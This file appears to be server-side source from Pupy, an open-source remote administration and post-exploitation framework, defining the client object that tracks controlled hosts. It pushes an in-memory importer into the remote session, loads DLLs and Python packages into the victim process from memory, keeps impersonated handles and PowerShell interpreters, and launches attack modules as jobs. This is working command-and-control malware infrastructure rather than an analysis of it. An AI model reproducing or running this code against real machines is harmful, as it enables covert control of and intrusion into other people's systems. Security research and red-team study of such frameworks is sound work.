# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
import sys, os, os.path
import textwrap
import logging
import cPickle
from .PupyErrors import PupyModuleError
import traceback
import textwrap
from .PupyJob import PupyJob
import imp
import platform

from pupylib.payloads import dependencies

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

class PupyClient(object):
    def __init__(self, desc, pupsrv):
        self.desc = desc
        self.powershell = {
            'x64': {'object': None, 'scripts_loaded': []},
            'x86': {'object': None, 'scripts_loaded': []}
        }

        #alias
        self.conn = self.desc["conn"]
        self.pupsrv = pupsrv
        self.load_pupyimporter()
        self.imported_dlls = set()

        #to reuse impersonated handle in other modules
        self.impersonated_dupHandle = None

    def __str__(self):
        return "PupyClient(id=%s, user=%s, hostname=%s, platform=%s)"%(
            self.desc["id"], self.desc["user"],
            self.desc["hostname"], self.desc["platform"]
        )

    def __del__(self):
        del self.desc
        # close the powershell interpreter
        for arch in ['x64', 'x86']:
            if self.powershell[arch]['object']:
                self.powershell[arch]['object'].stdin.write("exit\n")
        del self.powershell

    def get_conf(self):
        dic={}
        if "offline_script" in self.desc:
            dic["offline_script"]=self.desc["offline_script"]
        dic["launcher"]=self.desc["launcher"]
        dic["launcher_args"]=self.desc["launcher_args"]
        return dic

    def short_name(self):
        try:
            return '_'.join([
                self.desc["platform"][0:3].lower(),
                self.desc["hostname"],
                self.desc["macaddr"].replace(':','')
            ])

        except Exception:
            return "unknown"

    def node(self):
        return self.desc['macaddr'].replace(':', '').lower()

    def is_unix(self):
        return not self.is_windows()

    def is_posix(self):
        return self.desc['os_name'].lower() == 'posix'

    def is_linux(self):
        return "linux" in self.desc["platform"].lower()

    def is_android(self):
        return self.desc["platform"].lower()=="android"

    def is_windows(self):
        if "windows" in self.desc["platform"].lower():
            return True
        return False

    def is_solaris(self):
        return "sunos" in self.desc["platform"].lower()

    def is_darwin(self):
        if "darwin" in self.desc["platform"].lower():
            return True
        return False

    @property
    def platform(self):
        if self.is_android():
            return 'android'
        elif self.is_windows():
            return 'windows'
        elif self.is_linux():
            return 'linux'
        elif self.is_darwin():
            return 'darwin'
        elif self.is_solaris():
            return 'solaris'
        elif self.is_unix():
            return 'unix'

    @property
    def os_arch(self):
        arch = self.desc['os_arch'].lower()
        substitute = {
            'x86_64': 'amd64',
            'i386': 'x86',
            'i686': 'x86',
            'i486': 'x86',
        }
        return substitute.get(arch, arch)

    @property
    def arch(self):
        os_arch_to_platform = {
            'amd64': 'intel',
            'x86': 'intel',
            'i86pc': 'sun-intel',
            'armv7l': 'arm',
            'aarch64': 'arm',
        }

        os_platform_to_arch = {
            'intel': {
                '32bit': 'x86',
                '64bit': 'amd64'
            },
            'sun-intel': {
                # Yes.. Just one arch supported
                # The script is for amd64
                '32bit': 'i86pc',
                '64bit': 'i86pc'
            },
            'arm': {
                '32bit': 'arm',
                '64bit': 'aarch64'
            }
        }

        if self.os_arch in os_arch_to_platform:
            return os_platform_to_arch[
                os_arch_to_platform[self.os_arch]
            ][self.desc['proc_arch']]
        else:
            return None

    def is_proc_arch_64_bits(self):
        if "64" in self.desc["proc_arch"]:
            return True
        return False

    def match_server_arch(self):
        try:
            return all([
                self.desc['platform']==platform.system(),
                self.desc['proc_arch']==platform.architecture()[0],
                self.desc['os_arch']==platform.machine()
            ])

        except Exception as e:
            logging.error(e)
        return False

    def load_pupyimporter(self):
        """ load pupyimporter in case it is not """
        if "pupyimporter" not in self.conn.modules.sys.modules:
            pupyimporter_code=""
            with open(os.path.join(ROOT, "packages","all","pupyimporter.py"),'rb') as f:
                pupyimporter_code=f.read()
            self.conn.execute(textwrap.dedent(
            """
            import imp
            import sys
            def pupyimporter_preimporter(code):
                mod = imp.new_module("pupyimporter")
                mod.__name__="pupyimporter"
                mod.__file__="<memimport>\\\\pupyimporter"
                mod.__package__="pupyimporter"
                sys.modules["pupyimporter"]=mod
                exec code+"\\n" in mod.__dict__
                mod.install()
                """))
            self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)

        pupyimporter = self.conn.modules.pupyimporter

        try:
            self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_request_hook)
            pupyimporter.register_package_request_hook(self.remote_load_package)
        except:
            pass

        try:
            self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_error_hook)
            pupyimporter.register_package_error_hook(self.remote_print_error)
        except:
            pass

    def load_dll(self, path):
        """
            load some dll from memory like sqlite3.dll needed for some .pyd to work
            Don't load pywintypes27.dll and pythoncom27.dll with this. Use load_package("pythoncom") instead
        """
        name = os.path.basename(path)
        if name in self.imported_dlls:
            return False

        buf = dependencies.dll(name, self.platform, self.arch)
        if not buf:
            raise ImportError('Shared object {} not found'.format(name))

        if not self.conn.modules.pupy.load_dll(name, buf):
            raise ImportError('Couldn\'t load shared object {}'.format(name))

        self.imported_dlls.add(name)
        return True

    def filter_new_modules(self, modules, force=False):
        if force:
            return list(modules)

        pupyimporter = self.conn.modules.pupyimporter

        if hasattr(pupyimporter, 'new_modules'):
            return pupyimporter.new_modules(modules)
        else:
            return [
                module for module in modules if not pupyimporter.has_module(module)
            ]

    def load_package(self, requirements, force=False, remote=False, new_deps=[]):
        pupyimporter = self.conn.modules.pupyimporter

        try:
            blob, packages = dependencies.package(
                requirements, self.platform, self.arch, remote=remote,
                posix=self.is_posix(),
                filter_needed_cb=lambda modules: self.filter_new_modules(modules, force)
            )

        except dependencies.NotFoundError, e:
            raise ValueError('Module not found: {}'.format(e))

        if not packages:
            return False

        new_deps.extend(packages)

        pupyimporter.pupy_add_package(
            blob,
            compressed=True,
            # Use None to prevent import-then-clean-then-search behavior
            name=(
                None if ( remote or type(requirements) != str ) else requirements
            )
        )

        return True

    def unload_package(self, module_name):
        if not module_name.endswith(('.so', '.dll', '.pyd')):
            self.conn.modules.pupyimporter.invalidate_module(module_name)

    def remote_load_package(self, module_name):
        logging.debug("remote module_name asked for : %s"%module_name)

        try:
            self.load_package(module_name, remote=True)
            return True

        except dependencies.NotFoundError:
            logging.debug("no package %s found for remote client"%module_name)

        return False

    def remote_print_error(self, msg):
        self.pupsrv.handler.display_warning(msg)

    def run_module(self, module_name, args):
        """ start a module on this unique client and return the corresponding job """
        module_name=self.pupsrv.get_module_name_from_category(module_name)
        mod=self.pupsrv.get_module(module_name)
        if not mod:
            raise Exception("unknown module %s !"%modargs.module)
        pj=None
        modjobs=[x for x in self.pupsrv.jobs.itervalues() if x.pupymodules[0].get_name() == mod.get_name() and x.pupymodules[0].client==self]
        if mod.daemon and mod.unique_instance and modjobs:
            pj=modjobs[0]
        else:
            pj=PupyJob(self.pupsrv,"%s %s"%(module_name, args))
            ps=mod(self, pj)
            pj.add_module(ps)
            self.pupsrv.add_job(pj)
        pj.start(args)
        return pj
